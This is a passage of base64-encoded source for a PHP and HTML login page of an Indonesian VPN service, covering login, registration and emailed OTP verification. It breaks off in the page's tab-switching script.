QogICAgICAgIGVsc2UgewogICAgICAgICAgICAkZGI9Z2V0REIoKTsKICAgICAgICAgICAgJHN0PSRkYi0+cHJlcGFyZSgiU0VMRUNUICogRlJPTSB1c2VycyBXSEVSRSB1c2VybmFtZT0/IE9SIGVtYWlsPT8iKTsKICAgICAgICAgICAgJHN0LT5leGVjdXRlKFskdSwkdV0pOyAkdXNlcj0kc3QtPmZldGNoKCk7CiAgICAgICAgICAgIGlmICgkdXNlciAmJiBwYXNzd29yZF92ZXJpZnkoJHAsJHVzZXJbJ3Bhc3N3b3JkJ10pKSB7CiAgICAgICAgICAgICAgICBpZiAoISR1c2VyWydpc192ZXJpZmllZCddICYmICR1c2VyWydyb2xlJ109PT0ndXNlcicpIHsKICAgICAgICAgICAgICAgICAgICAkZXJyb3I9J0VtYWlsIGJlbHVtIGRpdmVyaWZpa2FzaSEgQ2VrIGluYm94IGthbXUuJzsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJF9TRVNTSU9OWyd1c2VyX2lkJ109JHVzZXJbJ2lkJ107CiAgICAgICAgICAgICAgICAgICAgJF9TRVNTSU9OWyd1c2VybmFtZSddPSR1c2VyWyd1c2VybmFtZSddOwogICAgICAgICAgICAgICAgICAgICRfU0VTU0lPTlsncm9sZSddPSR1c2VyWydyb2xlJ107CiAgICAgICAgICAgICAgICAgICAgJF9TRVNTSU9OWydzYWxkbyddPSR1c2VyWydzYWxkbyddOwogICAgICAgICAgICAgICAgICAgICRpcD0kX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9GT1InXT8/JF9TRVJWRVJbJ1JFTU9URV9BRERSJ107CiAgICAgICAgICAgICAgICAgICAgJGRiLT5wcmVwYXJlKCJVUERBVEUgdXNlcnMgU0VUIGlwX2FkZHJlc3M9PyBXSEVSRSBpZD0/IiktPmV4ZWN1dGUoWyRpcCwkdXNlclsnaWQnXV0pOwogICAgICAgICAgICAgICAgICAgIGhlYWRlcignTG9jYXRpb246IC9vcmRlcnZwbi9kYXNoYm9hcmQucGhwJyk7IGV4aXQ7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSB7ICRlcnJvcj0nVXNlcm5hbWUgYXRhdSBwYXNzd29yZCBzYWxhaCEnOyB9CiAgICAgICAgfQogICAgfQoKICAgIGlmICgkYWN0aW9uPT09J3JlZ2lzdGVyJykgewogICAgICAgICR1PXNhbml0aXplKCRfUE9TVFsncmVnX3VzZXJuYW1lJ10/PycnKTsKICAgICAgICAkZT1zYW5pdGl6ZSgkX1BPU1RbJ3JlZ19lbWFpbCddPz8nJyk7CiAgICAgICAgJHA9JF9QT1NUWydyZWdfcGFzc3dvcmQnXT8/Jyc7CiAgICAgICAgJGM9JF9QT1NUWydyZWdfY29uZmlybSddPz8nJzsKICAgICAgICBpZiAoZW1wdHkoJHUpfHxlbXB0eSgkZSl8fGVtcHR5KCRwKSkgeyAkZXJyb3I9J1NlbXVhIGZpZWxkIHdhamliIGRpaXNpISc7IH0KICAgICAgICBlbHNlaWYgKCRwIT09JGMpIHsgJGVycm9yPSdQYXNzd29yZCB0aWRhayBjb2NvayEnOyB9CiAgICAgICAgZWxzZWlmIChzdHJsZW4oJHApPDYpIHsgJGVycm9yPSdQYXNzd29yZCBtaW5pbWFsIDYga2FyYWt0ZXIhJzsgfQogICAgICAgIGVsc2VpZiAoIWZpbHRlcl92YXIoJGUsRklMVEVSX1ZBTElEQVRFX0VNQUlMKSkgeyAkZXJyb3I9J0Zvcm1hdCBlbWFpbCB0aWRhayB2YWxpZCEnOyB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRkYj1nZXREQigpOwogICAgICAgICAgICAkY2hrPSRkYi0+cHJlcGFyZSgiU0VMRUNUIGlkIEZST00gdXNlcnMgV0hFUkUgdXNlcm5hbWU9PyBPUiBlbWFpbD0/Iik7CiAgICAgICAgICAgICRjaGstPmV4ZWN1dGUoWyR1LCRlXSk7CiAgICAgICAgICAgIGlmICgkY2hrLT5mZXRjaCgpKSB7ICRlcnJvcj0nVXNlcm5hbWUgYXRhdSBlbWFpbCBzdWRhaCBkaWd1bmFrYW4hJzsgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRvdHAgPSBzdHJfcGFkKHJhbmQoMCw5OTk5OTkpLDYsJzAnLFNUUl9QQURfTEVGVCk7CiAgICAgICAgICAgICAgICAkb3RwRXhwID0gZGF0ZSgnWS1tLWQgSDppOnMnLCBzdHJ0b3RpbWUoJysxNSBtaW51dGVzJykpOwogICAgICAgICAgICAgICAgJGhhc2ggPSBwYXNzd29yZF9oYXNoKCRwLCBQQVNTV09SRF9CQ1JZUFQpOwogICAgICAgICAgICAgICAgJGRiLT5wcmVwYXJlKCJJTlNFUlQgSU5UTyB1c2VycyAodXNlcm5hbWUsZW1haWwscGFzc3dvcmQsb3RwX2NvZGUsb3RwX2V4cGlyZXMsaXNfdmVyaWZpZWQpIFZBTFVFUyAoPyw/LD8sPyw/LDApIikKICAgICAgICAgICAgICAgICAgIC0+ZXhlY3V0ZShbJHUsJGUsJGhhc2gsJG90cCwkb3RwRXhwXSk7CgogICAgICAgICAgICAgICAgLy8gS2lyaW0gT1RQCiAgICAgICAgICAgICAgICAkZW1haWxCb2R5ID0gIgogICAgICAgICAgICAgICAgPGRpdiBzdHlsZT0nZm9udC1mYW1pbHk6c2Fucy1zZXJpZjttYXgtd2lkdGg6NDgwcHg7bWFyZ2luOjAgYXV0bztiYWNrZ3JvdW5kOiMwZjE3MmE7Y29sb3I6I2YxZjVmOTtwYWRkaW5nOjMycHg7Ym9yZGVyLXJhZGl1czoxNnB4Oyc+CiAgICAgICAgICAgICAgICAgIDxoMiBzdHlsZT0nY29sb3I6IzYwYTVmYTttYXJnaW4tYm90dG9tOjhweDsnPvCfk7YgeyRhcHBOYW1lfTwvaDI+CiAgICAgICAgICAgICAgICAgIDxwIHN0eWxlPSdjb2xvcjojOTRhM2I4Oyc+VmVyaWZpa2FzaSBha3VuIGthbXU8L3A+CiAgICAgICAgICAgICAgICAgIDxkaXYgc3R5bGU9J2JhY2tncm91bmQ6IzFlMjkzYjtib3JkZXItcmFkaXVzOjEycHg7cGFkZGluZzoyNHB4O21hcmdpbjoyNHB4IDA7dGV4dC1hbGlnbjpjZW50ZXI7Jz4KICAgICAgICAgICAgICAgICAgICA8cCBzdHlsZT0nY29sb3I6Izk0YTNiODtmb250LXNpemU6MTRweDttYXJnaW4tYm90dG9tOjhweDsnPktvZGUgT1RQIGthbXU6PC9wPgogICAgICAgICAgICAgICAgICAgIDxkaXYgc3R5bGU9J2ZvbnQtc2l6ZTo0MHB4O2ZvbnQtd2VpZ2h0OjgwMDtsZXR0ZXItc3BhY2luZzoxMnB4O2NvbG9yOiM2MGE1ZmE7Jz57JG90cH08L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8cCBzdHlsZT0nY29sb3I6IzQ3NTU2OTtmb250LXNpemU6MTJweDttYXJnaW4tdG9wOjEycHg7Jz5CZXJsYWt1IDE1IG1lbml0PC9wPgogICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgPHAgc3R5bGU9J2NvbG9yOiM2NDc0OGI7Zm9udC1zaXplOjEycHg7Jz5KaWthIGthbXUgdGlkYWsgbWVuZGFmdGFyLCBhYmFpa2FuIGVtYWlsIGluaS48L3A+CiAgICAgICAgICAgICAgICA8L2Rpdj4iOwogICAgICAgICAgICAgICAgc2VuZEVtYWlsKCRlLCAiS29kZSBPVFAgVmVyaWZpa2FzaSAtIHskYXBwTmFtZX0iLCAkZW1haWxCb2R5KTsKICAgICAgICAgICAgICAgICRzdWNjZXNzPSdBa3VuIGJlcmhhc2lsIGRpYnVhdCEgQ2VrIGVtYWlsIHVudHVrIGtvZGUgT1RQIHZlcmlmaWthc2kuJzsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBpZiAoJGFjdGlvbj09PSd2ZXJpZnlfb3RwJykgewogICAgICAgICRlPXNhbml0aXplKCRfUE9TVFsnb3RwX2VtYWlsJ10/PycnKTsKICAgICAgICAkb3RwPXNhbml0aXplKCRfUE9TVFsnb3RwX2NvZGUnXT8/JycpOwogICAgICAgICRkYj1nZXREQigpOwogICAgICAgICRzdD0kZGItPnByZXBhcmUoIlNFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgZW1haWw9PyBBTkQgb3RwX2NvZGU9PyBBTkQgb3RwX2V4cGlyZXMgPiBOT1coKSIpOwogICAgICAgICRzdC0+ZXhlY3V0ZShbJGUsJG90cF0pOyAkdXNlcj0kc3QtPmZldGNoKCk7CiAgICAgICAgaWYgKCR1c2VyKSB7CiAgICAgICAgICAgICRkYi0+cHJlcGFyZSgiVVBEQVRFIHVzZXJzIFNFVCBpc192ZXJpZmllZD0xLCBvdHBfY29kZT1OVUxMLCBvdHBfZXhwaXJlcz1OVUxMIFdIRVJFIGlkPT8iKS0+ZXhlY3V0ZShbJHVzZXJbJ2lkJ11dKTsKICAgICAgICAgICAgJHN1Y2Nlc3M9J0VtYWlsIGJlcmhhc2lsIGRpdmVyaWZpa2FzaSEgU2lsYWthbiBsb2dpbi4nOwogICAgICAgIH0gZWxzZSB7ICRlcnJvcj0nS29kZSBPVFAgc2FsYWggYXRhdSBzdWRhaCBleHBpcmVkISc7IH0KICAgIH0KCiAgICBpZiAoJGFjdGlvbj09PSdyZXNlbmRfb3RwJykgewogICAgICAgICRlPXNhbml0aXplKCRfUE9TVFsncmVzZW5kX2VtYWlsJ10/PycnKTsKICAgICAgICAkZGI9Z2V0REIoKTsKICAgICAgICAkc3Q9JGRiLT5wcmVwYXJlKCJTRUxFQ1QgKiBGUk9NIHVzZXJzIFdIRVJFIGVtYWlsPT8gQU5EIGlzX3ZlcmlmaWVkPTAiKTsKICAgICAgICAkc3QtPmV4ZWN1dGUoWyRlXSk7ICR1c2VyPSRzdC0+ZmV0Y2goKTsKICAgICAgICBpZiAoJHVzZXIpIHsKICAgICAgICAgICAgJG90cD1zdHJfcGFkKHJhbmQoMCw5OTk5OTkpLDYsJzAnLFNUUl9QQURfTEVGVCk7CiAgICAgICAgICAgICRvdHBFeHA9ZGF0ZSgnWS1tLWQgSDppOnMnLHN0cnRvdGltZSgnKzE1IG1pbnV0ZXMnKSk7CiAgICAgICAgICAgICRkYi0+cHJlcGFyZSgiVVBEQVRFIHVzZXJzIFNFVCBvdHBfY29kZT0/LG90cF9leHBpcmVzPT8gV0hFUkUgaWQ9PyIpLT5leGVjdXRlKFskb3RwLCRvdHBFeHAsJHVzZXJbJ2lkJ11dKTsKICAgICAgICAgICAgJGVtYWlsQm9keT0iPGRpdiBzdHlsZT0nZm9udC1mYW1pbHk6c2Fucy1zZXJpZjtwYWRkaW5nOjMycHg7YmFja2dyb3VuZDojMGYxNzJhO2NvbG9yOiNmMWY1Zjk7Ym9yZGVyLXJhZGl1czoxNnB4Oyc+PGgyIHN0eWxlPSdjb2xvcjojNjBhNWZhOyc+S29kZSBPVFAgQmFydTwvaDI+PGRpdiBzdHlsZT0nZm9udC1zaXplOjQwcHg7Zm9udC13ZWlnaHQ6ODAwO2xldHRlci1zcGFjaW5nOjEycHg7Y29sb3I6IzYwYTVmYTt0ZXh0LWFsaWduOmNlbnRlcjttYXJnaW46MjRweCAwOyc+eyRvdHB9PC9kaXY+PHAgc3R5bGU9J2NvbG9yOiM2NDc0OGI7Zm9udC1zaXplOjEycHg7Jz5CZXJsYWt1IDE1IG1lbml0LjwvcD48L2Rpdj4iOwogICAgICAgICAgICBzZW5kRW1haWwoJGUsIktvZGUgT1RQIEJhcnUgLSB7JGFwcE5hbWV9IiwkZW1haWxCb2R5KTsKICAgICAgICAgICAgJHN1Y2Nlc3M9J09UUCBiYXJ1IHN1ZGFoIGRpa2lyaW0ga2UgZW1haWwga2FtdS4nOwogICAgICAgIH0gZWxzZSB7ICRlcnJvcj0nRW1haWwgdGlkYWsgZGl0ZW11a2FuIGF0YXUgc3VkYWggdGVydmVyaWZpa2FzaS4nOyB9CiAgICB9Cn0KPz4KPCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImlkIj4KPGhlYWQ+CjxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgo8dGl0bGU+PD89JGFwcE5hbWU/PiDigJQgTG9naW48L3RpdGxlPgo8c3R5bGU+Cip7Ym94LXNpemluZzpib3JkZXItYm94O21hcmdpbjowO3BhZGRpbmc6MH0KYm9keXtmb250LWZhbWlseTonU2Vnb2UgVUknLHN5c3RlbS11aSxzYW5zLXNlcmlmO2JhY2tncm91bmQ6IzA2MGQxYTttaW4taGVpZ2h0OjEwMHZoO2Rpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7anVzdGlmeS1jb250ZW50OmNlbnRlcjtwYWRkaW5nOjFyZW07b3ZlcmZsb3c6aGlkZGVufQouYmctZ2xvd3twb3NpdGlvbjpmaXhlZDtpbnNldDowO3BvaW50ZXItZXZlbnRzOm5vbmU7ei1pbmRleDowfQouYmctZ2xvdzo6YmVmb3Jle2NvbnRlbnQ6Jyc7cG9zaXRpb246YWJzb2x1dGU7dG9wOi0yMCU7bGVmdDotMjAlO3dpZHRoOjYwJTtoZWlnaHQ6NjAlO2JhY2tncm91bmQ6cmFkaWFsLWdyYWRpZW50KGNpcmNsZSwjMWQ0ZWQ4MjAgMCUsdHJhbnNwYXJlbnQgNzAlKTthbmltYXRpb246ZHJpZnQxIDhzIGVhc2UtaW4tb3V0IGluZmluaXRlIGFsdGVybmF0ZX0KLmJnLWdsb3c6OmFmdGVye2NvbnRlbnQ6Jyc7cG9zaXRpb246YWJzb2x1dGU7Ym90dG9tOi0yMCU7cmlnaHQ6LTIwJTt3aWR0aDo2MCU7aGVpZ2h0OjYwJTtiYWNrZ3JvdW5kOnJhZGlhbC1ncmFkaWVudChjaXJjbGUsIzBlNzQ5MCAyMCAwJSx0cmFuc3BhcmVudCA3MCUpO2FuaW1hdGlvbjpkcmlmdDIgMTBzIGVhc2UtaW4tb3V0IGluZmluaXRlIGFsdGVybmF0ZX0KQGtleWZyYW1lcyBkcmlmdDF7dG97dHJhbnNmb3JtOnRyYW5zbGF0ZSgzMHB4LC0yMHB4KX19CkBrZXlmcmFtZXMgZHJpZnQye3Rve3RyYW5zZm9ybTp0cmFuc2xhdGUoLTMwcHgsMjBweCl9fQoud3JhcHt3aWR0aDoxMDAlO21heC13aWR0aDo0MjBweDtwb3NpdGlvbjpyZWxhdGl2ZTt6LWluZGV4OjF9Ci5sb2dve3RleHQtYWxpZ246Y2VudGVyO21hcmdpbi1ib3R0b206MS43NXJlbX0KLmxvZ28taWNvbntmb250LXNpemU6M3JlbTtkaXNwbGF5OmJsb2NrO2ZpbHRlcjpkcm9wLXNoYWRvdygwIDAgMjBweCAjM2I4MmY2KX0KLmxvZ28gaDF7Y29sb3I6I2YxZjVmOTtmb250LXNpemU6MS42cmVtO2ZvbnQtd2VpZ2h0OjgwMDttYXJnaW4tdG9wOi41cmVtO2xldHRlci1zcGFjaW5nOi4wMmVtfQoubG9nbyBwe2NvbG9yOiM0NzU1Njk7Zm9udC1zaXplOi44NXJlbTttYXJnaW4tdG9wOi4yNXJlbX0KLmNhcmR7YmFja2dyb3VuZDpyZ2JhKDE1LDIzLDQyLC44NSk7Ym9yZGVyOjFweCBzb2xpZCAjMWUzYTVmO2JvcmRlci1yYWRpdXM6MjBweDtwYWRkaW5nOjEuNzVyZW07YmFja2Ryb3AtZmlsdGVyOmJsdXIoMjBweCk7Ym94LXNoYWRvdzowIDIwcHggNjBweCByZ2JhKDAsMCwwLC41KX0KLnRhYnN7ZGlzcGxheTpmbGV4O2JhY2tncm91bmQ6IzBhMTYyODtib3JkZXItcmFkaXVzOjEwcHg7cGFkZGluZzo0cHg7bWFyZ2luLWJvdHRvbToxLjVyZW19Ci50YWItYnRue2ZsZXg6MTtwYWRkaW5nOi41NXJlbTtib3JkZXI6bm9uZTtib3JkZXItcmFkaXVzOjdweDtjdXJzb3I6cG9pbnRlcjtmb250LXNpemU6Ljg3NXJlbTtmb250LXdlaWdodDo2MDA7Zm9udC1mYW1pbHk6aW5oZXJpdDt0cmFuc2l0aW9uOmFsbCAuMnN9Ci50YWItYnRuLmFjdGl2ZXtiYWNrZ3JvdW5kOmxpbmVhci1ncmFkaWVudCgxMzVkZWcsIzI1NjNlYiwjMGVhNWU5KTtjb2xvcjojZmZmO2JveC1zaGFkb3c6MCA0cHggMTVweCAjMjU2M2ViNDR9Ci50YWItYnRuOm5vdCguYWN0aXZlKXtiYWNrZ3JvdW5kOnRyYW5zcGFyZW50O2NvbG9yOiM0NzU1Njl9Ci50YWItY29udGVudHtkaXNwbGF5Om5vbmV9LnRhYi1jb250ZW50LmFjdGl2ZXtkaXNwbGF5OmJsb2NrfQouZm9ybS1ncm91cHttYXJnaW4tYm90dG9tOjFyZW19CmxhYmVse2Rpc3BsYXk6YmxvY2s7Zm9udC1zaXplOi44cmVtO2ZvbnQtd2VpZ2h0OjYwMDtjb2xvcjojNjQ3NDhiO21hcmdpbi1ib3R0b206LjRyZW07dGV4dC10cmFuc2Zvcm06dXBwZXJjYXNlO2xldHRlci1zcGFjaW5nOi4wNWVtfQppbnB1dFt0eXBlPXRleHRdLGlucHV0W3R5cGU9ZW1haWxdLGlucHV0W3R5cGU9cGFzc3dvcmRdLGlucHV0W3R5cGU9bnVtYmVyXXsKICB3aWR0aDoxMDAlO3BhZGRpbmc6Ljc1cmVtIDFyZW07YmFja2dyb3VuZDojMGExNjI4O2JvcmRlcjoxcHggc29saWQgIzFlM2E1ZjsKICBib3JkZXItcmFkaXVzOjEwcHg7Y29sb3I6I2YxZjVmOTtmb250LXNpemU6LjlyZW07Zm9udC1mYW1pbHk6aW5oZXJpdDtvdXRsaW5lOm5vbmU7dHJhbnNpdGlvbjpib3JkZXIgLjJzfQppbnB1dDpmb2N1c3tib3JkZXItY29sb3I6IzNiODJmNjtib3gtc2hhZG93OjAgMCAwIDNweCAjM2I4MmY2MTB9CmlucHV0OjpwbGFjZWhvbGRlcntjb2xvcjojMzM0MTU1fQouYnRue3dpZHRoOjEwMCU7cGFkZGluZzouOHJlbTtib3JkZXI6bm9uZTtib3JkZXItcmFkaXVzOjEwcHg7Zm9udC1zaXplOi45cmVtO2ZvbnQtd2VpZ2h0OjcwMDtjdXJzb3I6cG9pbnRlcjtmb250LWZhbWlseTppbmhlcml0O3RyYW5zaXRpb246YWxsIC4yczttYXJnaW4tdG9wOi41cmVtO2xldHRlci1zcGFjaW5nOi4wM2VtfQouYnRuLXByaW1hcnl7YmFja2dyb3VuZDpsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCMyNTYzZWIsIzBlYTVlOSk7Y29sb3I6I2ZmZjtib3gtc2hhZG93OjAgNHB4IDIwcHggIzI1NjNlYjMzfQouYnRuLXByaW1hcnk6aG92ZXJ7dHJhbnNmb3JtOnRyYW5zbGF0ZVkoLTFweCk7Ym94LXNoYWRvdzowIDhweCAyNXB4ICMyNTYzZWI0NH0KLmJ0bi1zZWNvbmRhcnl7YmFja2dyb3VuZDp0cmFuc3BhcmVudDtib3JkZXI6MXB4IHNvbGlkICMxZTNhNWY7Y29sb3I6IzY0NzQ4YjttYXJnaW4tdG9wOi41cmVtfQouYnRuLXNlY29uZGFyeTpob3Zlcntib3JkZXItY29sb3I6IzNiODJmNjtjb2xvcjojNjBhNWZhfQouYWxlcnR7cGFkZGluZzouNzVyZW0gMXJlbTtib3JkZXItcmFkaXVzOjEwcHg7Zm9udC1zaXplOi44NXJlbTttYXJnaW4tYm90dG9tOjFyZW07ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmZsZXgtc3RhcnQ7Z2FwOi41cmVtfQouYWxlcnQtZXJyb3J7YmFja2dyb3VuZDojN2YxZDFkMjI7Ym9yZGVyOjFweCBzb2xpZCAjN2YxZDFkNTU7Y29sb3I6I2ZjYTVhNX0KLmFsZXJ0LXN1Y2Nlc3N7YmFja2dyb3VuZDojMDY0ZTNiMjI7Ym9yZGVyOjFweCBzb2xpZCAjMDY1ZjQ2NTU7Y29sb3I6IzZlZTdiN30KLmRpdmlkZXJ7ZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtnYXA6Ljc1cmVtO21hcmdpbjoxcmVtIDA7Y29sb3I6IzMzNDE1NTtmb250LXNpemU6LjhyZW19Ci5kaXZpZGVyOjpiZWZvcmUsLmRpdmlkZXI6OmFmdGVye2NvbnRlbnQ6Jyc7ZmxleDoxO2JvcmRlci10b3A6MXB4IHNvbGlkICMxZTI5M2J9Ci5vdHAtaW5wdXR7ZGlzcGxheTpmbGV4O2dhcDouNXJlbTtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyO21hcmdpbjouNzVyZW0gMH0KLm90cC1pbnB1dCBpbnB1dHt3aWR0aDo0OHB4O2hlaWdodDo1NnB4O3RleHQtYWxpZ246Y2VudGVyO2ZvbnQtc2l6ZToxLjRyZW07Zm9udC13ZWlnaHQ6NzAwO3BhZGRpbmc6MDtsZXR0ZXItc3BhY2luZzowfQo8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5Pgo8ZGl2IGNsYXNzPSJiZy1nbG93Ij48L2Rpdj4KPGRpdiBjbGFzcz0id3JhcCI+CiAgPGRpdiBjbGFzcz0ibG9nbyI+CiAgICA8c3BhbiBjbGFzcz0ibG9nby1pY29uIj7wn5O2PC9zcGFuPgogICAgPGgxPjw/PSRhcHBOYW1lPz48L2gxPgogICAgPHA+UHJlbWl1bSBWUE4gU2VydmljZSBJbmRvbmVzaWE8L3A+CiAgPC9kaXY+CiAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICA8ZGl2IGNsYXNzPSJ0YWJzIj4KICAgICAgPGJ1dHRvbiBjbGFzcz0idGFiLWJ0biBhY3RpdmUiIGlkPSJidG5Mb2dpbiIgb25jbGljaz0ic2hvd1RhYignbG9naW4nKSI+TWFzdWs8L2J1dHRvbj4KICAgICAgPGJ1dHRvbiBjbGFzcz0idGFiLWJ0biIgaWQ9ImJ0blJlZyIgb25jbGljaz0ic2hvd1RhYigncmVnaXN0ZXInKSI+RGFmdGFyPC9idXR0b24+CiAgICAgIDxidXR0b24gY2xhc3M9InRhYi1idG4iIGlkPSJidG5PdHAiIG9uY2xpY2s9InNob3dUYWIoJ290cCcpIiBzdHlsZT0iZGlzcGxheTpub25lIj5WZXJpZmlrYXNpPC9idXR0b24+CiAgICA8L2Rpdj4KCiAgICA8P3BocCBpZigkZXJyb3IpOj8+PGRpdiBjbGFzcz0iYWxlcnQgYWxlcnQtZXJyb3IiPuKaoO+4jyA8Pz0kZXJyb3I/PjwvZGl2Pjw/cGhwIGVuZGlmOz8+CiAgICA8P3BocCBpZigkc3VjY2Vzcyk6Pz48ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj7inIUgPD89JHN1Y2Nlc3M/PjwvZGl2Pjw/cGhwIGVuZGlmOz8+CgogICAgPCEtLSBMT0dJTiAtLT4KICAgIDxkaXYgY2xhc3M9InRhYi1jb250ZW50IGFjdGl2ZSIgaWQ9InRhYi1sb2dpbiI+CiAgICAgIDxmb3JtIG1ldGhvZD0iUE9TVCI+CiAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYWN0aW9uIiB2YWx1ZT0ibG9naW4iPgogICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPjxsYWJlbD5Vc2VybmFtZSAvIEVtYWlsPC9sYWJlbD4KICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VybmFtZSIgcGxhY2Vob2xkZXI9Ik1hc3Vra2FuIHVzZXJuYW1lIGF0YXUgZW1haWwiIHJlcXVpcmVkPjwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPjxsYWJlbD5QYXNzd29yZDwvbGFiZWw+CiAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3N3b3JkIiBwbGFjZWhvbGRlcj0i4oCi4oCi4oCi4oCi4oCi4oCi4oCi4oCiIiByZXF1aXJlZD48L2Rpdj4KICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSI+8J+UkCBNYXN1ayBTZWthcmFuZzwvYnV0dG9uPgogICAgICA8L2Zvcm0+CiAgICA8L2Rpdj4KCiAgICA8IS0tIFJFR0lTVEVSIC0tPgogICAgPGRpdiBjbGFzcz0idGFiLWNvbnRlbnQiIGlkPSJ0YWItcmVnaXN0ZXIiPgogICAgICA8Zm9ybSBtZXRob2Q9IlBPU1QiIGlkPSJyZWdGb3JtIj4KICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhY3Rpb24iIHZhbHVlPSJyZWdpc3RlciI+CiAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+PGxhYmVsPlVzZXJuYW1lPC9sYWJlbD4KICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJyZWdfdXNlcm5hbWUiIHBsYWNlaG9sZGVyPSJCdWF0IHVzZXJuYW1lIHVuaWsiIHJlcXVpcmVkPjwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPjxsYWJlbD5FbWFpbDwvbGFiZWw+CiAgICAgICAgICA8aW5wdXQgdHlwZT0iZW1haWwiIG5hbWU9InJlZ19lbWFpbCIgaWQ9InJlZ0VtYWlsIiBwbGFjZWhvbGRlcj0iZW1haWxAa2FtdS5jb20iIHJlcXVpcmVkPjwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPjxsYWJlbD5QYXNzd29yZDwvbGFiZWw+CiAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InJlZ19wYXNzd29yZCIgcGxhY2Vob2xkZXI9Ik1pbi4gNiBrYXJha3RlciIgcmVxdWlyZWQ+PC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+PGxhYmVsPktvbmZpcm1hc2kgUGFzc3dvcmQ8L2xhYmVsPgogICAgICAgICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJyZWdfY29uZmlybSIgcGxhY2Vob2xkZXI9IlVsYW5naSBwYXNzd29yZCIgcmVxdWlyZWQ+PC9kaXY+CiAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXByaW1hcnkiPuKcqCBCdWF0IEFrdW48L2J1dHRvbj4KICAgICAgPC9mb3JtPgogICAgPC9kaXY+CgogICAgPCEtLSBPVFAgVkVSSUZZIC0tPgogICAgPGRpdiBjbGFzcz0idGFiLWNvbnRlbnQiIGlkPSJ0YWItb3RwIj4KICAgICAgPHAgc3R5bGU9ImNvbG9yOiM2NDc0OGI7Zm9udC1zaXplOi44NXJlbTttYXJnaW4tYm90dG9tOjEuMjVyZW07Ij5NYXN1a2thbiBrb2RlIDYgZGlnaXQgeWFuZyBkaWtpcmltIGtlIGVtYWlsIGthbXUuPC9wPgogICAgICA8Zm9ybSBtZXRob2Q9IlBPU1QiPgogICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImFjdGlvbiIgdmFsdWU9InZlcmlmeV9vdHAiPgogICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im90cF9lbWFpbCIgaWQ9Im90cEVtYWlsIiB2YWx1ZT0iIj4KICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj48bGFiZWw+S29kZSBPVFA8L2xhYmVsPgogICAgICAgICAgPGlucHV0IHR5cGU9Im51bWJlciIgbmFtZT0ib3RwX2NvZGUiIHBsYWNlaG9sZGVyPSIwMDAwMDAiIG1heGxlbmd0aD0iNiIgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyO2ZvbnQtc2l6ZToxLjVyZW07Zm9udC13ZWlnaHQ6NzAwO2xldHRlci1zcGFjaW5nOi4zZW07IiByZXF1aXJlZD48L2Rpdj4KICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSI+4pyFIFZlcmlmaWthc2k8L2J1dHRvbj4KICAgICAgPC9mb3JtPgogICAgICA8ZGl2IGNsYXNzPSJkaXZpZGVyIj5hdGF1PC9kaXY+CiAgICAgIDxmb3JtIG1ldGhvZD0iUE9TVCI+CiAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYWN0aW9uIiB2YWx1ZT0icmVzZW5kX290cCI+CiAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icmVzZW5kX2VtYWlsIiBpZD0icmVzZW5kRW1haWwiIHZhbHVlPSIiPgogICAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zZWNvbmRhcnkiPvCflIEgS2lyaW0gVWxhbmcgT1RQPC9idXR0b24+CiAgICAgIDwvZm9ybT4KICAgIDwvZGl2PgogIDwvZGl2Pgo8L2Rpdj4KPHNjcmlwdD4KZnVuY3Rpb24gc2hvd1RhYih0KXsKICBbJ2xvZ2luJywncmVnaXN0